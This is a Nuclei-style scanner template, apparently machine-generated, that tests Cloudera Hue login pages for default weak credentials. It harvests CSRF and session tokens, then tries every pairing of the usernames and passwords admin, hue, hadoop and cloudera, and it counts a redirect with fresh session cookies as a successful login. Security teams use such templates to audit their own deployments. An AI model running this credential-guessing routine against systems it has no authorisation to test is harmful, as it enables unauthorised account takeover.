id: poc-yaml-cloudera-hue-weak-password

info:
  name: Cloudera Hue Weak Password Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password,hue

variables:
  users:
    - admin
    - hue
    - hadoop
    - cloudera
  password:
    - admin
    - hue
    - hadoop
    - cloudera

http:
  - id: initial-request
    method: GET
    path:
      - "{{BaseURL}}/hue/accounts/login?next=/"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Welcome to Hue"
        part: body
    extractors:
      - type: regex
        name: csrftoken
        part: header
        internal: true
        regex:
          - "csrftoken=(.*?);"
      - type: regex
        name: sessionid
        part: header
        internal: true
        regex:
          - "sessionid=(.*?);"
      - type: regex
        name: csrfmiddlewaretoken
        part: body
        internal: true
        regex:
          - "name='csrfmiddlewaretoken' value='(.*?)'"

  - id: login-request
    method: POST
    path:
      - "{{BaseURL}}/hue/accounts/login"
    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      Cookie: "csrftoken={{csrftoken}}; sessionid={{sessionid}}"
    body: "csrfmiddlewaretoken={{csrfmiddlewaretoken}}&username={{users}}&password={{password}}&next=%2F"
    payloads:
      users:
        - "admin"
        - "hue"
        - "hadoop"
        - "cloudera"
      password:
        - "admin"
        - "hue"
        - "hadoop"
        - "cloudera"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
      - type: regex
        part: header
        regex:
          - "csrftoken="
      - type: regex
        part: header
        regex:
          - "sessionid="
